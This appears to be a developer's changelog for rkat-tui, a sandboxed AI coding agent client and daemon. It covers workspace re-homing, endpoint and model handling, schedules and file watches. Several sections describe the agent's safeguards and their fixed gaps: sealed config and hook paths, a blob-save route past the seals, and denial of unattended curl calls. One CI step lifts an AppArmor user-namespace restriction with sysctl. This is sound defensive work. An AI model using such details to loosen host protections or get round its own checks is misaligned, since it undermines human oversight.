The workspace root is composed into the daemon at its start: the
confinement plan (`bootstrap::confinement`, the workspace grant), the
file tools' project root, the project `.rkat/` layers and MCP servers,
and the endpoint file's key (`sha256(path)`). None of these can be
re-rooted in a running daemon through the engine's public API, so a
re-home stops the daemon and the client starts it again in the new
place.

### The client is re-rooted in process

`/rehome <arg>` no longer quits. The runner (`AttachRunner::rehome`)
prepares, stops its own daemon over its connection, drops the link
(`unlink`, so the stop is not taken for a lost connection), carries the
re-home out, and then builds its configuration again for the new
workspace through `AttachConfig::reroot` (`Reroot::configure`:
production reads the workspace's layers again, `configure_with` with
this host's paths, which also refuses a `!` shell that would reach the
realm). `AttachRunner::reroot` installs it:

- the workbench (`Workbench::reroot`: the scope, the `!` shell's plan,
  the endpoints; a running `!` command is cancelled first; `@` mentions
  expand in the new root through the scope);
- the UI (`Msg::Rerooted`: `@` completion's workspace and its path index
  dropped, the `!` shell's confinement label, and `LocalEffect::Reroot`
  for the UI loop: the realm's input history and drafts directory);
- the log (`app::reroute_logging`: the log file is behind a switchable
  writer, so a pull, whose realm changes, logs into the adopted realm and
  not into the removed one);
- the attach: a first connect again (start on demand in the new
  workspace), the cursor file of the new realm, and the agent: a push
  asks for the conversation it showed (`AgentChoice::Conversation`, which
  binds its restored agent), a pull for the most recent one of the
  adopted realm. The conversation is rendered from its start (the new
  daemon's events are numbered anew).

A failure after the daemon stopped but before the commit restarts the
daemon in the old place (nothing moved). A configuration that cannot be
built after the commit (a flag or `tui.toml` grant that reaches the realm
from the new root) is reported with what moved; the TUI then has no
daemon and says to start `rkat-tui` in the new directory.

`rkat-tui --rehome <id|old path>` is the pull from the shell
(`rehome::pull_here`): the same checks with no client of its own, both
daemons stopped when idle, nothing started.

Tests (`tests/rehome.rs`):
`a_push_moves_the_session_to_the_new_workspace_without_a_restart` (the
same session after the push, a `pwd` through the agent's shell printing
the new directory and a relative `write_file` landing there, the second
client disconnected with one attach and the new daemon counting the
issuer only, a fresh `-c` in the new directory continuing the session,
and a start in the old directory getting a fresh realm that does not list
the old session); `a_push_while_a_turn_runs_is_refused` (another agent's
gated turn, named; the manifest untouched, the daemon serving);
`a_rehome_into_a_realm_that_holds_a_conversation_is_refused` (push and
pull, the realms unchanged);
`a_pull_from_a_fresh_start_in_the_moved_directory_adopts_the_old_realm`
(the empty realm removed, the transcript of the adopted conversation, a
turn on it); `a_pull_stops_the_idle_daemon_of_the_adopted_realm` (the old
path reads two ways until `from`; the original's daemon stopped);
`after_a_shell_rehome_continue_resumes_the_latest_conversation_in_the_new_place`.
Unit: `realm_home`'s
`a_reference_reads_as_a_pull_or_a_push_and_both_is_refused`,
`a_commit_moves_the_path_and_removes_only_an_empty_realm`,
`a_commit_is_refused_while_a_lease_is_live_or_unreadable`,
`a_workspace_that_reaches_the_realm_is_refused`,
`a_manifest_is_read_strictly`; UI
`rehome_asks_the_runner_and_a_reroot_moves_the_ui`. Removed with the
behaviour they pinned: `a_rehome_is_refused_while_a_daemon_holds_the_realm`
and `a_rehome_moves_the_path_and_sets_the_new_realm_aside`.

## CI runs the sandbox rows (maintainer, zond/rkat-tui#1, 2026-11-10)

The hosted log of 8c494bd showed every row behind `sandbox_unavailable`
(`tests/confinement.rs`, the confined rows of `tests/daemon.rs`)
finishing in 0.03–0.16 s: the `SKIPPED:` early return, because the
runner's AppArmor restricts unprivileged user namespaces. So CI proved
"the realm is outside every grant" by path comparison only.

The test job now lifts the restriction
(`sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`), gives the
home an `.ssh` to hide, and sets `RKAT_TUI_REQUIRE_SANDBOX=1`:
`common::sandbox_skipped`, which every skip of those rows goes through,
then fails the test instead of printing `SKIPPED:`. Locally, without the
variable, the rows skip as before; with it, this machine runs all 28
rows of `confinement` and `daemon` (10 s).

The maintainer also found that the engine's in-process file tools could
write the project's `.rkat/` inputs (lukacf/meerkat#2170). The agent
gets rkat-tui's own file tools behind the gate, whose tier 0 seals
`.rkat/` (`approval::policy`):
`approval_service::the_file_tools_cannot_write_the_projects_rkat_inputs`
has the agent write `.rkat/mcp.toml`, `.rkat/tui.toml`,
`.rkat/config.toml` and `.rkat/hooks/pre-turn.sh` with a classifier that
allows everything: every call is refused, the classifier is never asked,
and no file exists afterwards. `sealed_paths_are_denied_before_rules_and_classifier`
lists the project `tui.toml` and a hook script too.

## `-c` after a restart follows the last turn, not the last seat

Hosted CI failed `a_push_moves_the_session_to_the_new_workspace_without_a_restart`
twice (runs 42879079732, 42879973942): the fresh `-c` after the push
showed another, newer session. Cause: two agents worked in the realm (the
issuer's, and a second client's `AgentChoice::New`), both restored when the
daemon started in the new place, and `Agents::start` orders restored agents
by the conversation log's `last_used`, which only a seat or a switch moved
(`Conversations::touch`), never a turn. The second agent was seated after
the issuer's, so it counted as the most recent and `-c` joined its empty
conversation; locally both seats usually fell in one second and the tie
went the other way. So the product was wrong, not the test: `-c` after any
restart (not only a re-home) could join the wrong agent.

Fix: a user's prompt or steer for an agent (`Local::observe` on
`mob/member_send`, `mob/turn_start`) touches its current conversation in
the log, and `Log::touch` moves the entry last, so a tie of seconds goes to
the conversation touched later (`Log::newest_first`). Pinned by the tie
case in `the_log_records_each_session_once_and_lists_the_last_used_first`
and, end to end on the hosted runner, by the push test.

## Backwards compatibility removed (2026-11-10)

The user's decision: rkat-tui has one user, who always builds the client
and the daemon together, so nothing is kept only for reading or meeting
what an older build produced. Kept: what is a feature in its own right
(Claude Code parity names), and fail-closed refusals that merely trigger
on old layouts.

### The wire

- The handshake: the daemon refused nothing but a wrong token from a
  client that sent the token as is (ce98fe7 kept it); now an attach
  without a nonce is refused (`handshake::read_attach`), and
  `AttachParams` has no `token` field (`Connection::attach_io` takes the
  token beside the parameters and never serializes it). The client's
  `ClientError::DaemonTooOld` (an old daemon's token request, a daemon
  whose `initialize` lists no decision methods) is gone.
- An attach that is no probe must name its agent choice
  (`BindError::Unnamed`); a client of before P5 named none and got the
  most recent agent. `Connection::attach_as` asks for the most recent one
  explicitly.
- `main` (the single orchestrator of before P5) is no longer an agent
  name (`agents::is_agent`), and its cursor file `attach.cursor` is no
  longer special (`CursorFile::for_agent`). `ORCHESTRATOR` stays as the
  profile name.
- `Status::agents` and `Status::shell` are required (the client's "a
  confinement it does not report (an older daemon)" branch is gone), and
  so are `ApprovalNote::Decision::session_id` and `FileDiffNote::agent`;
  `--list` has no line shape for a daemon without agents.

Tests rewritten to the mutual handshake: `handshake`'s unit tests (the
right proof attaches, a wrong proof or a bare token is unauthorized),
`serve`'s seat tests (`admit_one`), `tests/daemon.rs`'s raw client.
Deleted with the paths they pinned:
`client::runner::tests::a_daemon_without_the_decision_methods_is_too_old`,
the old-daemon half of
`transport::tests::a_squatter_that_does_not_know_the_token_never_receives_it`,
the "daemon of before P5" case of `the_quit_decision_follows_the_rules`
(`tests/lifecycle.rs`) and the agentless shape of `--list` (`list::tests`).

### On-disk formats

- `conversations.json`: `Entry::agent` is required (a log of before P5
  named none and was the single orchestrator's), both structs deny
  unknown fields, and `Log::load`, which read an unreadable log as an
  empty one (the next save then forgot every conversation), is gone:
  `Log::read` returns `LogError` naming the file, and the daemon's start
  fails with it (`DaemonError::ConversationLog`).
- The cost record's `tui_endpoints/` sidecars (before `tui_cost/`) are no
  longer read. A `tui_cost/` record that cannot be parsed is still moved
  aside and the session starts from its authoritative usage: that is
  corruption handling, not an older shape.
- `tui.toml`'s `attach` (the in-process runner's switch, ignored with a
  notice since P4) is no field any more; `RulesFile` denies unknown
  fields, so a file setting it is refused naming the file.
- The realm manifest went strict with the re-home rework above.

Deleted with the paths they pinned: `a_log_from_before_p5_belongs_to_main`,
`legacy_sidecars_still_load`; rewritten:
`the_daemon_is_the_default_and_a_tui_toml_attach_key_is_refused` (was
`…_is_ignored_with_a_notice`), and the log test now pins that an
unreadable or agentless log is an error naming the file.

### The view-only sessions

`/resume` listed the realm's sessions no mob member ran (the removed
in-process runner's) as "view only", and could show their transcript
(`Conversations::earlier`, `Listed::view_only`, the runner's `viewing`,
`Report::Viewed`, `Again::Back`, `sessions::view_only_notice`). Realms
live outside the workspace since the move and none was migrated, so no
realm can hold such a session: all of it went, and `Listed::agent` is
required (a listed conversation is always some agent's). Engine ask 7
(seating a member on a non-member session) is no longer needed here.
Deleted with it: `sessions::tests::earlier_sessions_are_marked_and_named_by_id_only`
and `conversations::a_session_outside_the_mob_cannot_be_seated_on_the_member`
(its second half probed the engine's refusal for such a session, which
no product path reaches any more).

### Names, aliases and upgrade notices

Removed, each an older name or a one-time upgrade message:
`--provider` (`--endpoint`), `--context-root` (`-w`), `--allow-project-mcp`
(`--trust-project`), `/rules` (`/permissions`, the Claude Code name),
`/mcp trust` (`/trust`; Claude Code's `/mcp` manages servers, which this
was not), the serde spellings `manual` and `accept_edits` of the
permission modes (`acceptEdits`, Claude Code's settings name, stays, and
so do the typed forms `/mode manual` and `/mode accept_edits`: `manual`
is the status bar's own label); the legacy config directory fallback
(`~/.config/rkat-tui`, `$XDG_CONFIG_HOME/rkat-tui`, `%APPDATA%`) with its
notice (`dirs::legacy_config_notice`, `LegacyRoots`); the notice about the
pre-`GlobalDirs` global rules file `~/.rkat/tui.toml`
(`Notice::LegacyGlobalRulesIgnored`); and the notice about an old
`<workspace>/.rkat/tui/` (`realm_home::old_realm_notice`,
`RuntimeScope::notices`). Kept: such a directory is still never read
(`scope::tests::a_planted_workspace_realm_is_ignored`, rewritten without
the notice), and Claude Code's command aliases (`/exit`, `/q`, `/new`,
`/checkpoint`, `/undo`, `/cost`, `/stats`, `/tasks`, `/?`).

Deleted with them: `dirs::tests::an_existing_legacy_dir_is_used_when_the_default_is_missing`,
`windows_legacy_dir_is_the_platform_config`,
`a_legacy_dir_gets_one_notice_naming_the_default_and_the_flag`,
`config::tests::legacy_global_rules_notice_only_when_old_file_exists`;
`cli::tests` and `commands::tests::rules_commands` now pin that the old
names no longer parse.

## `blob_save_file` passes the path seals (2026-11-10)

The engine's `blob_save_file` (`meerkat-tools` 0.9.11,
`builtin/utility/blob_file.rs`: `BlobSaveFileArgs { blob_id, path,
overwrite }`) writes a stored blob to `path` inside the project root. The
gate parsed it as `ActionKind::Other`, so it went to the classifier (or,
in manual mode, to the user) and no seal saw its target: a save into
`.git/hooks/pre-commit` or `.rkat/mcp.toml` was a question, not a
refusal. `Action::kind` now reads a native `blob_save_file` as
`ActionKind::FileWrite { paths: [path] }` (`policy::BLOB_SAVE_FILE`), so
tier 0 (sealed and secret roots, the daemon's `DenySnapshot` consequence
policy included), the protected paths, the permission modes, plan mode
and the agent-written list treat it as a `write_file` of that path. An
MCP tool of the same name stays foreign. Tests:
`approval::engine::tests::a_blob_save_into_a_sealed_path_is_refused_at_tier_zero`
(every mode, no classifier call, nobody asked),
`a_blob_save_is_decided_like_a_write_of_its_destination` (an ordinary and
a protected destination, every mode, the same question and verdict as
`write_file`), the secret root in
`policy::tests::the_endpoint_directory_is_sealed_for_reads_and_searches`,
and `daemon::policy::tests::deny_rules_and_sealed_writes_are_refused_and_nothing_else`.

## A configured endpoint's listing decides its models' window (2026-11-10)

Before, a configured endpoint's window reached rkat-tui's own consumers
only for models the catalog did not know: the client's gauge asked the
realm's model registry first (`registry_context_window`, the catalog row
for a catalogued id) and the endpoint's list only when the registry had
nothing, and the orchestrator's compaction threshold came from the
registry alone. An Anthropic-dialect gateway serving `claude-sonnet-4-6`
with a 50k window therefore showed, and compacted at, the catalog's
window. Now, for a configured (non-built-in) endpoint, the listing comes
first in both (`bootstrap::model_window`, the runner's
`send_context_window`), and the registry decides only where the listing
says nothing; built-in endpoints keep the registry first. The daemon
lists the chosen configured endpoint at start when `--model` named the
model explicitly (before, the list was read only to resolve a bare id),
and the client fetches the lists in the background when it shows a
configured endpoint's model and sends the window again when they arrive.
`/context` reads the same status window. `LiteLlmModelInfo` parses
`supports_reasoning`, `supports_vision` and `supports_function_calling`
into `ModelEntry::capabilities` (a non-boolean value is "not reported").
Tests: `tests/models.rs::a_configured_endpoint_s_listing_decides_the_window_and_the_threshold`
(the gauge and `Daemon::compact_threshold` follow the gateway's 50k; the
built-in endpoint keeps the catalog's window) and
`models::tests::litellm_model_info_fills_the_listing_with_its_flags`.

## The endpoint is the authority for the models it serves (2026-11-10)

The user's decision: for a configured endpoint (a LiteLLM proxy first)
the model list and every per-model fact come from the endpoint, not the
engine's static catalog, and a later catalog addition must never stop the
daemon from starting. Endpoint-qualified names `<endpoint>:<model>` in
`/model`, the status line and stored sessions are accepted. The engine
facts are `.handover`'s section 8 (0.9.11, re-verified at HEAD c42e5e4: the
`src/` lines it cites moved with the compatibility removal, the engine
lines did not).

### The probe, on running code

Settled against a fake LiteLLM-shaped endpoint in the test process
(`tests/common/fake_openai.rs`: `/v1/models`, `/model/info`, streamed
`/v1/responses` and `/v1/chat/completions` from a script, every request
recorded), with the engine's own HTTP clients, no provider key and the
user's token store closed (`BootstrapOptions::without_token_store`, the
rig's `Setup::engine_clients`). The key is read from `CARGO_MANIFEST_DIR`,
which Cargo sets for every test process and the confined shell's
allow-list never passes.

- (a) Credentials: a realm binding whose backend is `self_hosted` /
  `openai_compatible` with `server = <endpoint>` and an `api_key` auth
  profile reading the endpoint's `api_key_env` carries the key; the engine
  sends it as `Authorization: Bearer` (the explicit binding is validated
  against the alias's server, `validate_explicit_self_hosted_target`). The
  realm document names the variable, never the key, and the confined
  shell's environment does not carry it (`confined_environment`, an
  allow-list). Tests:
  `tests/litellm.rs::a_litellm_endpoint_runs_a_catalogued_claude_id_on_its_own_facts`,
  `both_api_styles_stream_text_reasoning_and_tool_calls`.
- (b) Switching: `rkat/set_model` reconfigures the live member from
  `litellm:local-coder` (provider `self_hosted`) to the built-in
  `openai:gpt-5.5` and back to `litellm:claude-opus-5-5`, each turn on the
  wire with the right model; a restarted daemon resumes the conversation
  on the alias and runs it. Test:
  `the_live_member_switches_between_an_alias_and_a_built_in_model`. Found
  on the way: the hot swap resolves a built-in provider's default binding
  from the `global` realm root, not from the workspace realm's own
  `[realm.<id>]` section, which rkat-tui's `resolve_builtin` does read;
  the test therefore puts the built-in binding under `[realm.global]`
  (in real use the built-in key comes from the environment, where both
  agree). Recorded, not acted on.
- (c) Helpers: a `delegate` helper of an agent on an alias inherits it
  through the owner's endpoint (SEC-1 E2 rule): its requests name the
  proxy's model and carry the proxy's key. A model a helper asks for by
  its plain name becomes the endpoint's alias (`customizer::qualify_model`,
  unit-tested in
  `a_helper_of_a_self_hosted_owner_asks_for_the_endpoint_s_alias`). Test:
  `a_helper_inherits_the_alias_through_the_owner_s_endpoint`.
- (d) `[thinking]` resolves to nothing for a self-hosted session
  (`ThinkingTable::resolve` is Anthropic-only, and start-up already drops
  an `endpoint:model` key on an OpenAI-dialect endpoint with a notice);
  the proxy's `supports_reasoning` decides `supports_reasoning` and
  `supports_thinking` of the alias. Price lookup: the client names the
  model as the proxy lists it (`endpoints::from_engine` turns the
  engine's alias back into the model and the OpenAI dialect, in
  `remote::snapshot` and the `rkat/set_model` answer), and the usage the
  engine accounts to the alias is priced as its model
  (`PriceTable::lookup` retries `<endpoint>:<model>` as `<model>`;
  `pricing::tests::lookups_follow_normalisation_and_file_order`). The
  context gauge looks the alias up in the registry when the listing is
  not there yet.
- (e) Protocol: both engine API styles work against the fake, text,
  reasoning (`reasoning_summary_text.delta`, `reasoning_content`) and tool
  calls alike, and name the proxy's model on the wire. rkat-tui uses the
  Responses API, which its OpenAI dialect always spoke to LiteLLM; Chat
  Completions needs the base URL with `/v1` (the chat client appends
  `/chat/completions` as given, the Responses delegate trims `/v1` and
  appends `/v1/responses`). Test:
  `both_api_styles_stream_text_reasoning_and_tool_calls`.

### What was built (item 3; item 5's fallback was not needed)

- A configured OpenAI-dialect endpoint is a self-hosted endpoint
  (`Endpoint::is_self_hosted`). `EndpointProjection` adds its
  `self_hosted.servers.<endpoint>` (OpenAI-compatible, the endpoint's URL,
  Responses) and its connection in `rkat-tui-self-hosted`, whose backend
  names the server. The project-input guard keeps exactly these
  servers and the aliases on them in an untrusted realm config.
- Every model is the alias `<endpoint>:<model>`
  (`Endpoint::engine_model`), with `remote_model` the model, written by
  `alias_patch` from the listing; at start for the start-up model, the
  classifier's and every model the proxy lists, in `rkat/set_model` for
  the target (and the member is seated again when its alias was new). The
  first alias becomes `self_hosted.default_model`, which the engine
  requires once there are two. No `[models.<id>]` is written for such an
  endpoint, so no alias can collide with a catalog id.
- `ModelChoice` carries the engine's model, provider and server; the
  orchestrator profile, the root customizer, the classifier and
  `rkat/set_model` give the engine those, and everything the client sees
  is the model as the endpoint lists it.

### Conversations stored before, and a rebuild's binding

A self-hosted endpoint's connection is projected into its own realm
section, `rkat-tui-self-hosted` (`SELF_HOSTED_REALM`), not over the
`rkat-tui-endpoints` entry of the same name: a conversation an earlier
build stored on the proxy names that entry with the OpenAI provider, and
overwriting it with a `self_hosted` backend made its rebuild fail
("resolves backend=SelfHosted ..., expected provider ..."), and with it
every turn, `/model` and `/new` of that agent (retiring it stuck at
`retire-runtime-route`). Entries are never removed, so the old one keeps
resolving; nothing reads an older shape. `is_endpoint_realm` names both
sections wherever a binding is mapped to its endpoint. On the way: a
rebuilt root member took the start-up endpoint's binding
(`shape_root` filled an empty `auth_binding` on resume as on a fresh
spawn, and the engine prefers the spec's over the durable one), so a
conversation made on another endpoint could not be rebuilt, or moved
silently when the dialects agreed; `customize_resume` now gives it its
durable binding. Test:
`tests/litellm.rs::a_conversation_stored_under_the_dialect_provider_moves_onto_the_alias`
and `customizer::tests::the_root_member_is_shaped_as_an_owner`. Found and
not fixed (it is not this batch's): `/model` before a restored agent's
first turn is refused with "Runtime not ready: destroyed" on every
endpoint, built-in ones included; the first input loads the session.
Fixed in P6 X1 (below).

### Item 4: ownership and pruning for the other dialects

`ensure_model_profile` records each `[models.<id>]` entry it creates in
the realm's `tui_models.json` (`OwnedProfiles`) before writing it.
`prune_catalogued_profiles` runs before the first realm write at start
and in `rkat/set_model`: an entry whose id the catalog now defines is
dropped when rkat-tui wrote it (start-up notice `pruned_notice`) and is
`EndpointError::ProfileShadowsCatalog`, naming the entry and the fix,
when the user did. Reading such a document works (only writes and the
registry validate), so the prune can run where the engine would refuse.
Tests: `endpoints::tests::profiles_the_catalog_now_defines_are_pruned_or_refused`,
`written_profiles_are_recorded_as_rkat_tui_s`, and on the rig
`tests/models.rs::a_profile_the_catalog_now_defines_is_dropped_or_named`.
The upstream ask is engine ask 9 in `docs/mob-split.md`.

### The section 8 rig test

`a_litellm_endpoint_runs_a_catalogued_claude_id_on_its_own_facts`: the
fake lists `claude-opus-5-5` with a 50k window, a 4,096 output limit and
prices; the session runs, the request's `model` is `claude-opus-5-5`, it
carries no `anthropic-beta` header and no `thinking` field, the gauge
shows 50k and `Daemon::compact_threshold` follows it, the endpoint's
prices price the turn, and the realm document holds the alias and no
`[models."claude-opus-5-5"]`. Negative case:
`the_built_in_endpoint_keeps_the_catalog_row` (the same id on the built-in
`anthropic` endpoint: the catalog's window, provider `anthropic`, no
binding, no alias).

## P6 (2026-11-10)

### X1: `/model` before a restored agent's first turn

Cause, on running code: an agent the daemon restores at start is seated
in the mob but dormant: the engine materializes its session in the
runtime only when something reaches it (a turn, a peer's message). The
engine's LLM reconfigure (`reconfigure_session_llm_identity_inner`,
meerkat-runtime 0.9.11 `meerkat_machine/llm_reconfigure.rs`) reads the
session's runtime state and answers a missing one as
`NotReady { state: Destroyed }`, which is the "Runtime not ready:
destroyed" the user saw. A switch to a model whose profile had to be
written first worked by accident: it reseats the member, which loads it.
The fix is the engine's own wake: `MobHandle::ensure_member_live`
(`WakeMember`, cause Operator; runs no turn) through
`MobMcpState::mob_handles_snapshot`, called by
`Conversations::while_idle` after the running check and before the
reconfigure. No retry or fallback: a refused wake is the switch's typed
refusal. Test:
`tests/models.rs::a_restored_agent_switches_models_before_its_first_turn`
(a restarted daemon, `/model anthropic:claude-opus-4-8` before any turn
is applied, and the next turn's request names it; it failed with the
notice "model not changed: Runtime not ready: destroyed" before the fix).

### X2: `api_style` for OpenAI-dialect endpoints

`[endpoints.<name>] api_style = "responses" | "chat_completions"`
(`ApiStyle`, `--endpoint-def …,api_style=STYLE`), default `responses`,
`openai` dialect only (another dialect's endpoint is skipped with
`EndpointSkip::ApiStyleDialect`). Parsed strictly by its own
`Deserialize`, whose error names the key and both values
(`ApiStyleError`), so a `tui.toml` or `--set` with another value stops
the start with that sentence. The style goes to the engine's
`self_hosted.servers.<endpoint>.api_style`.

The base URL, verified on the engine's clients (meerkat-openai 0.9.11
`client_compatible.rs`): the Chat Completions client posts to
`<base>/chat/completions` as given, the Responses delegate trims a
trailing `/v1` and posts to `<base>/v1/responses`; and the URL it uses is
the binding's backend profile's, not only the server entry's (the first
run of the new test went to `/chat/completions` with only the server
entry adjusted). `server_base_url` therefore appends `/v1` for Chat
Completions unless the URL ends in it, in both the server entry and the
self-hosted backend profile, and leaves the Responses URL as configured;
the user keeps writing the server's root, as the manual already asked.
Tests: `tests/litellm.rs::the_api_style_setting_picks_the_wire_end_to_end`
(through the daemon, the same base URL, both styles: reasoning streamed, a
`read_file` call through the gate whose result is in the second request,
the answer, the projected server's style and URL),
`both_api_styles_stream_text_reasoning_and_tool_calls` (now chosen by the
setting on one URL), `an_unknown_api_style_is_refused_naming_the_key`,
`endpoints::tests::chat_completions_gets_v1_and_responses_keeps_the_url`,
`api_style_is_parsed_strictly_and_only_for_the_openai_dialect` and the
overlay cases.

### A: schedules (items 1 to 5 and 15)

The engine, read and run (0.9.11): the facade's `schedule` feature (and
`meerkat-rpc`'s, which the daemon's `SessionRuntime` is) brings the
whole composition; nothing had to be hand-built. `SessionRuntime` opens
its `ScheduleService` from the realm's `PersistenceBundle` (the schedule
domain lives in the realm's `sessions.sqlite3`, outside the workspace),
installs `ScheduleToolDispatcher` as the builder's default schedule tools,
and arms its own firing host (`spawn_schedule_host` with the RPC mob host
over the runtime's mob state, `MobMcpScheduleHost`) on a session's
creation. The factory composes the tools for a build whose schedule
category resolves on (`AgentFactory::schedule(true)`, the orchestrator
profile's `tools.schedule`, and for a mob created before that, the root
member's spawn override `tool_category_overrides.schedule = Enable`), and
wraps them for a mob member in `CurrentSessionScheduleToolDispatcher`
with `MobMemberCurrentSessionScheduleResolver`: `"current_session"`
becomes the identity target `mob_member:{"mob_id":"tui","member":…}`,
which survives conversation switches and restarts, and fires as the
mob's `member_send` of the prompt (waking a dormant member). Probes that
needed a change: without the profile's or the spawn's category the tools
are absent (`tool_not_found`, the first run of the rig test); a restored
agent creates no session, so the daemon arms the host itself after the
agents start (`SessionRuntime::ensure_schedule_host_started`). The host
sleeps until the store's next action, so an occurrence fires on time
(the rig test's fired at +2.6 s for +2.5 s). Misfires: the default policy
`skip` has a 30 s grace (`DEFAULT_SKIP_MISFIRE_GRACE_SECONDS`), so a
daemon stopped over a due time skips that occurrence when it is started
again; `catch_up_within {window_seconds}` fires one at most that late.

Cost, measured: the eight tools' definitions are 37 KB of JSON
(`meerkat_schedule_create` 15.2 KB, `_update` 15.3 KB, `_occurrences`
3.4 KB, the rest under 1.4 KB each), about 9k tokens on every request.
The full suite found it: `the_live_member_switches_between_an_alias_and_a_built_in_model`
ran its fake 32k-window model into "compaction is irreducible" (the
request body 122 KB); the fixture's window is 64k now, with the reason.
Recorded in the manual's limits; the brief's decision to enable the tools
stands.

Decisions:

- Classification (`src/approval/policy.rs`): `get`, `list`,
  `occurrences` read-only; `create`, `update`, `pause`, `resume`,
  `delete` reviewed; `upstream_builtins_are_all_classified` now covers
  `meerkat_schedule::schedule_tool_names()`. The dialog's argument text
  leads with the schedule in a line (`schedule_summary`: name, when, what
  it runs) before the whole arguments.
- Helpers get no schedule tools (`drop_mob_tools` sets the category off):
  a schedule is the agent's own decision to run later.
- A fired run is a turn no user started, so SEC-2 applies unchanged:
  unattended (reviewed calls denied, a queued notice) while nobody is
  attached to the agent, reviewed as usual while someone is. The texts of
  the denial and the notice no longer say "another agent's message" only.
- Attribution, positive only (`daemon::schedules::Schedules::attribute`):
  a run start the engine did not see a client's input start, whose input
  is the prompt of an occurrence of one of the agent's schedules
  dispatched since this daemon started and not attributed before. Tried
  for about a second (the store's dispatch write can trail the run
  start). An attributed run is announced to the agent's clients
  (`rkat/triggered`, the UI relabels the run's prompt block `⏰ scheduled:
  <name>`), written to the audit log as `run_triggered` with the run id
  the run's decision lines carry, and its turns' usage is kept under the
  cost record `schedule-<id>` in the realm (item 15). A run nothing proves
  is shown as before (the prompt as typed text); nothing is guessed.
- `/quit` deletes the retiring agent's schedules, before the retire so
  none fires in between (`Local::retire`; `retire_all` for terminate),
  audits `schedules_deleted` and names them in the farewell; the quit
  dialog says how many the agent has. `/detach` keeps them.
- `/schedules` (`rkat/schedules`, `ScheduleList`, `ScheduleOp`): the
  agent's live schedules whose identity target names it, filtered on our
  side. `meerkat_schedule_list`'s `phase`/`target_id` filters are
  0.9.12-only; at the pin move the filter can move to the engine.
  `--list` and `/agents` rows carry the count (`AgentRow::schedules`).

Tests (`tests/schedules.rs`): `a_schedule_the_agent_creates_fires_its_turn`
(the labelled block, the turn, `/schedules` before and after with `fired
1x`, the audit line, the user's own delete without an approval),
`creating_a_schedule_asks_in_manual_mode` (the dialog shows when, the
target and the prompt; a denial creates nothing),
`a_fired_schedule_is_unattended_while_nobody_is_attached` (detached: the
fired run's `curl` denied with no classifier call, the notice at the next
attach; attached: the next fired run's `curl` reviewed),
`a_retiring_agent_s_schedules_are_deleted_and_never_fire` (`--list`'s
count, the farewell, past the due time the other agent's sentinel turn is
the only call, and the stored schedule is deleted with no occurrence
dispatched). Unit: `daemon::schedules::tests`,
`a_schedule_call_reads_as_when_and_what`,
`a_triggered_run_relabels_its_prompt`,
`a_triggered_run_is_labelled_with_its_trigger`,
`quitting_and_listing_name_the_schedules`, `daemon::list` (the count).

### B: the file-watch tools (items 6 and 7)

The engine has no file-watch facility a member could use, so the daemon
watches: `notify` 8 (already in the engine's graph, CC0-1.0, allowed in
`deny.toml`), one recursive watch on the workspace set up on the first
`watch_paths`, held by the daemon's process; the confined shell plays no
part. `tools::WatchToolDispatcher` (`watch_paths`, `unwatch`, provenance
`rkat-tui.watch`, judged in the file tools' family as read-only, so tier
1) registers watches with `daemon::watches::Watches`, which matches each
changed path against every agent's globs, batches per agent until 250 ms
pass without a change, caps a batch at 50 named paths, and hands it to
`Agents::watch_event`: `mob_member_send` of `files changed: …` with
`HandlingMode::Steer` (into a running turn at its next boundary, else it
starts a run), an audit `watch_event` line and an `rkat/triggered`
announcement (the UI shows `◉ files changed` and does not show the run's
prompt again when the event starts a run). A run the event starts is
attributed to the watch by the text the daemon itself sent (audit
`run_triggered` "watch (…)"), and is a turn no user started.

Lifetime, decided: a watch lives until the run that made it ends (the
event watcher's run end calls `Watches::end_turn`); `once` watches live
until their first event instead (so "wake me when the build output
appears" works past the turn), then go; `unwatch` and retiring drop them
(`Watches::forget` in `Agents::retire`).

Own writes, found: distinguishable for the file tools, not for the
shell. The file tools report every change as a diff; the daemon's diff
forwarding records the path as the agent's own write
(`Watches::own_write`), and a change of that path within 2 s is not
reported to that agent (another agent's watch still hears it). The first
rig run also reported the write's temporary file (`src/.tmpXXXX`, created
and renamed over the target): a path created and gone (removed or renamed
away) within one batch is dropped as transient, for every agent; a
deletion of an existing file is still a change.

Tests: `tests/watches.rs::a_watched_change_reaches_the_agent_in_its_turn`
(the agent's own `write_file` not reported, another writer's file
reported as one message the next request carries, announced to the TUI,
`/status` lists the watch during the turn and nothing after it),
`a_once_watch_wakes_the_agent_once` (outlives its turn, the event starts
a turn labelled and audited as the watch's, gone after it); unit:
`daemon::watches::tests` (batching, the cap, other agents, once and turn
lifetimes, retire, own writes, transient files).

### Engine observations from the agent living in the harness (items 21, 22)

Recorded, not ours to fix; each is a candidate for a small test-only
report upstream if the user wants one.

- `mob_wire` right after `spawn_member` answers "member not found" and
  succeeds on a retry: a visibility race between the spawn's admission
  and the wire's roster read.
- `peer_connectivity` reports 0 reachable peers after messages to those
  peers went through.
- `list_members` leaves out the caller's own seat.
- `fork_off` children are turn-driven and not wired to their parent, by
  design: written into the manual (Helpers).
- The shell tool's default timeout killed a `sleep 30`: the engine's
  default (`DEFAULT_SHELL_TIMEOUT_SECS`, 30 s, meerkat-core `config.rs`)
  applies when the call names none, and the agent can pass
  `timeout_secs`. Decided: rkat-tui keeps the engine's default. A longer
  default makes every hung command hold a turn longer, a model that knows
  a command is slow can say so per call, and background jobs (item 9) are
  the way for long builds.
- `memory_search` (meerkat-memory `HnswMemoryStore`, hashed bag-of-words
  embeddings): it returns `limit` entries for any query, unrelated ones at
  a score of 0.5, with no relevance cutoff. Read from the source: the
  score is `1 - cosine_distance / 2`, and with non-negative embeddings the
  cosine distance is at most 1, so 0.5 is the mapping's floor (no shared
  word), not a default. A draft test-only report is in
  `.handover/p6-memory-report.md`, outside the repository, for the user
  to decide on.
- Facts inside long entries are diluted (one vector per entry); only user
  and assistant text is indexed, not tool output; compacted content
  becomes searchable only after the turn ends. The agent persona's memory
  paragraph says how to read results (item 22(a)).

### Item 10: the denial the model reads carries no user-facing tags

`ClassifierVerdict::Block` carries `annotation` (how stage 2 checked,
`Stage2Run::suffix`) beside `reason` instead of appending it, and
`DenyReason::Classifier` carries the annotation and the block-rule id
(`T3`, `D1`: the prompts' rule ids). The user's text (`Display`: the
notice, the dialog, the audit reason) shows both; the model's text
(`DenyReason::for_model`, used by `deny_message`) is the explanation
alone, with the advice that follows. Tests:
`approval::tests::deny_message_wording`,
`tests/approval_service.rs::a_classifier_block_reaches_the_model_and_the_run_continues`
(the notice has `[D1] [classifier checked 0 files]`, the tool result
neither), and the classifier tests now read the annotation apart.

